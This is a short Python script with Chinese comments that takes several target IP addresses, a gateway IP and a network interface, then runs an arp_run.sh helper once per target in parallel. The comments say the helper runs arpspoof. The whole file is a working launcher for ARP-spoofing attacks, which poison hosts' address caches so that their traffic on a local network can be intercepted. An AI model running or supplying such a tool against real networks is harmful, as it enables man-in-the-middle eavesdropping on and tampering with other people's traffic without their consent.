import subprocess
import argparse

def getArgsList():
    # 依次传入多个 target IP，最后一个是网关 IP
    parser = argparse.ArgumentParser(description="传参")
    parser.add_argument('--list', type=str, nargs="+", help='runHostIP', required=True)
    parser.add_argument('--interface', type=str, help='网络接口名', default='eth0')
    return parser.parse_args()

# 获取命令行参数
result = getArgsList()

target_ips = result.list[:-1]
gateway_ip = result.list[-1]
network_card = result.interface or 'eth0'

processes = []
for target_ip in target_ips:
    # 以异步方式运行 arpspoof
    proc = subprocess.Popen(['bash', 'arp_run.sh', target_ip, gateway_ip, network_card])
    processes.append(proc)

for proc in processes:
    # 等待所有的 arpspoof 进程完成
    proc.wait()